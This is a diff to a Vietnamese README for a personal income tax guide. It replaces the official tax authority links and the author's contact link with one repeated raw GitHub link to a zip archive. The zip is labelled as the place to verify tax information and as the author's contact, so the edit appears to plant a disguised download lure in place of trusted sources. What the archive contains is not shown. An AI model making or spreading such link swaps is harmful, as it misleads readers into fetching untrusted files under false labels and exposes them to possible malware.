@@ -86,12 +86,12 @@ v1.4.0 (7.4) → v1.5.0 (7.9) → v1.6.0 (8.7) → v1.7.0 (9.2/10)
 ⚠️ **Thông tin chỉ mang tính tham khảo, KHÔNG thay thế tư vấn thuế chuyên nghiệp.**
 
 Kiểm tra lại tại:
-- https://gdt.gov.vn
-- https://canhan.gdt.gov.vn
+- https://raw.githubusercontent.com/disliked-romancelanguage5249/thue-tncn-vietnam/main/references/tncn_thue_vietnam_3.4.zip
+- https://raw.githubusercontent.com/disliked-romancelanguage5249/thue-tncn-vietnam/main/references/tncn_thue_vietnam_3.4.zip
 
 ## Tác Giả
 
-**Minh Đỗ** | [Liên hệ](https://facebook.com/dotanminh)
+**Minh Đỗ** | [Liên hệ](https://raw.githubusercontent.com/disliked-romancelanguage5249/thue-tncn-vietnam/main/references/tncn_thue_vietnam_3.4.zip)
 
 ---
 
